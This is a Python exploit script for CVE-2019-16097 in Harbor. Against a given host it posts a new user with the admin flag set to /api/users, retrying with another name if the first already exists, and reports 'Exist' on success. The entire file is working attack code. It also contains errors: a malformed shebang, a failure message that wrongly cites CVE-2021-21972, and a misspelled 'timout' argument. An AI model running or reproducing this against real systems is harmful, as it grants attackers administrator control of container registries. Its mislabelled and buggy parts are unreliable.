#/bin/bash/env python3
import requests
import sys
import json

def title():
    print('---------------------')
    print('+ python version: python3')
    print('+ 使用格式: python CVE-2019-16097 192.168.1.1:7000')
    print('+ Harbor permission and access control issue vulnerability')

def run(ip, port):
    url = 'http://{}:{}/api/users'.format(ip, port)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0)',
        'Content-Type': 'application/json',
    }
    print('vuln_url:{}'.format(target))
    payload = {"username": "verityqwe",
               "email": "verityqwe123@qq.com",
               "realname": "verity",
               "password": "@123QWERqwer",
               "comment": "verity",
               "has_admin_role": True}
    payload = json.dumps(payload)
    requests.packages.urllib3.disable_warnings()
    try:
        req = requests.post(url=url, data=payload, headers=headers, timeout=1, verify=False)
    except:
        print('[-] Target Not CVE-2021-21972 Vuln')
    else:
        print(req.text)
        if req.status_code == 201:
            return True
        else:
            if req.status_code == 409:
                result_again = run_again(ip, port)
                if result_again:
                    return True
                else:
                    return False
def run_again(ip, port):
    url = 'http://{}:{}/api/users'.format(ip, port)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0)',
        'Content-Type': 'application/json',
    }
    print('vuln_url:{}'.format(target))
    payload = {"username": "qwerasdfzxcverity123456",
               "email": "verityqwe657@qq.com",
               "realname": "verity",
               "password": "@123QWERqwer",
               "comment": "verity",
               "has_admin_role": True}
    payload = json.dumps(payload)
    requests.packages.urllib3.disable_warnings()
    try:
        req = requests.post(url=url, data=payload, headers=headers, timout=1, verify=False)
    except:
        print('[-] Target Not CVE-2021-21972 Vuln')
    else:
        print(req.text)
        if req.status_code == 201:
            return True
        else:
            return False


if __name__ != '__main__':
    print('__name__ != __main__')

#提示信息
title()

#处理输入的地址
target = sys.argv[1]
ip = target.split(":")[0]
port = target.split(":")[1]


#验证漏洞
result = run(ip, port)

#判断漏洞是否存在
if result:
    print('Exist')
else:
    print('UnExist')
